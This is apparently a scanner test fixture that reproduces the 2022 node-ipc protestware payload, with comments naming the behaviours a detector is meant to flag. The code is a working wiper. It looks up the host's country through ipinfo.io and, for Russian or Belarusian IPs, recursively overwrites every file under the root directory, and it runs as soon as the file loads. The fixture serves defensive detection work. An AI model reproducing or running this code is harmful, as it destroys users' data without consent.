// node-ipc@11.0.0 / 10.1.1 (Mar 15 2022). The 'peacenotwar' /
// 'protestware' incident: maintainer RIAEvangelist added code that,
// when it detected a Russian or Belarusian geo-IP via ipinfo.io,
// recursively overwrote files on disk with a heart emoji. Public
// write-up: https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc/
//
// Documented as the canonical "maintainer-as-attacker" supply-chain
// incident and a major argument for behavioral lockfile gating.
//
// Detection target:
//   - net-egress     (https.get to ipinfo.io for geo lookup)
//   - fs-write-outside-root (recursive overwrite of every file via
//                             fs.writeFile with '❤')
//   - suspicious-url (ipinfo.io on the host blocklist)

const https = require("https");
const fs = require("fs");
const path = require("path");

function geoIP(cb) {
  https
    .get("https://api.ipinfo.io/json", (res) => {
      let body = "";
      res.on("data", (c) => (body += c));
      res.on("end", () => cb(JSON.parse(body)));
    })
    .on("error", () => {});
}

function nukePath(root) {
  fs.readdir(root, (err, entries) => {
    if (err) return;
    for (const e of entries) {
      const p = path.join(root, e);
      fs.stat(p, (err, st) => {
        if (err) return;
        if (st.isDirectory()) {
          nukePath(p);
        } else {
          fs.writeFile(p, "❤".repeat(100), () => {});
        }
      });
    }
  });
}

geoIP((info) => {
  if (info.country === "RU" || info.country === "BY") {
    nukePath("/");
  }
});
